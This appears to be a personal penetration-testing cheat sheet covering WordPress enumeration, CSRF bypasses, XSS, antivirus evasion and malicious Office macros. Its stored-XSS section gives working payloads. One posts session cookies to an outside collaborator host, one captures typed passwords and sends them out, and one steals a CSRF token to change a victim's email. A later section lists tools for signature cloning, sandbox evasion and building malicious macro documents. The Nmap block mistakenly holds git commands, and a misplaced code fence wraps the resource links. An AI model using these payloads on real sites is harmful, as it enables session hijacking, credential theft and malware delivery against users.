# pen-test-cheatsheet
## Scanning/Enumeration
### Tools
- nmap 
- nikto
- dirbuster

### Nmap
```
git status
git add
git commit
```
## WEB
### Wordpress

- Run wpscan to gain basic information on the website.

- Check for installed plugins, themes and default pages.

- By default, the route /wp-json/wp/v2/user can list users. 

- Try bruteforcing the login page and see if lockout policy is implemented, if DoS is prevented via blocking or connection throttling. To test the lockout, try 100+ passwords and then try to login.

- Check all possible input fields around the page for client-side vulnerabilities (ex. XSS, CSRF)

- Check if XML-RPC is enabled. Issuing a POST request to /xmlrpc.php with the following payload should return all available methods (if enabled):
```
  <?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params>
    <param>
    </param>
  </params>
</methodCall>
```
If enabled various attacks can be tested, Pingback, code injection, bruteforce etc.

### CSRF

If csrf token is present:
- Change method of request from POST to GET
- Try removing the csrf token from request completely
- Check if csrf token is tied to user session. Check if a csrf token of a logged in user will be accepted when the request is made by another user. 

### XSS

### Reflected

- Bypassing filters - When tags are filtered, use Burp to enumerate custom tags that pass the check. Use this custom tag with an onfocus event or an available event with a certain id, ex. id=’x’ and the code #x in the end of the command in order focus on this element as soon as the page is loaded.

### Stored

- Getting the session cookie of a user
```
<script> 
fetch('https://727hmmjs30bdhtmvi7l0ww5m8de42vqk.oastify.com', 
{ method: 'POST', 
mode: 'no-cors', 
body:document.cookie }); 
</script>
```

- Getting the user’s username and password
```
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```
- Forcing the user to issue a change mail request with a csrf token embedded
```
<script> var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/my-account',true); 
req.send(); 
function handleResponse() 
	{ var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
var changeReq = new XMLHttpRequest(); 
changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; 
#### Resources 
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
- https://github.com/rm-onata/xmlrpc-attack
```

### Useful web tools
- https://icyberchef.com/ - A powerful encoder/decoder for most formats.
- https://cirt.net/passwords - A comprehensive list of common/default password for vendor products and services.
  
## Bypassing AV & EDRs
### Tools
- Shellter - Dynamic shellcode injection tool aka dynamic PE infector (https://www.shellterproject.com)
- SigThief - Stealing Signatures and Making One Invalid Signature (https://github.com/secretsquirrel/SigThief)
- MetaTwin - Cloning metadata and digital signature (https://github.com/threatexpress/metatwin)
- CMiner - Finding code caves in PEs (https://github.com/EgeBalci/Cminer)
- CFF explorer - Viewing a file's details

## Windows
### MS Office Documents
#### Generating malicious macro-enabled documents
- Boobsnail - BoobSnail allows generating XLM (Excel 4.0) macro. (https://github.com/STMCyber/boobsnail)
- Evilclippy - A cross-platform assistant for creating malicious MS Office documents. Can hide VBA macros, stomp VBA code (via P-Code) and confuse macro analysis tools. (https://github.com/outflanknl/EvilClippy)
- Ivy - payload creation framework for the execution of arbitrary VBA (macro) source code in memory. (https://github.com/optiv/Ivy)
- Hot-manchego - Macro-Enabled Excel File Generator (.xlsm) using the EPPlus Library. (https://github.com/FortyNorthSecurity/hot-manchego)

#### Sandbox evasion with VBA referencing 
##### Tools
- Doctrack - Inserting tracking pixel and remote template for template injection. (https://github.com/wavvs/doctrack)
- intercepter.py - Custom python script to serve a tracking .png image, detect if code is running in a sandbox or user and serve a benign or malicious template.
##### Guides
- VBA Macro Remote Template Injection With Unlinking & Self-Deletion - https://medium.com/@john.woodman11/vba-macro-remote-template-injection-with-unlinking-self-deletion-49aef5eec0cd
- Sandbox Evasion using VBA referenencing - https://www.x33fcon.com/archive/2018/slides/x33fcon18_SandboxEvasionUsingVBAReferencing_ADori_AGrafi.pdf
- Remote template injection - https://blog.sunggwanchoi.com/remote-template-injection/
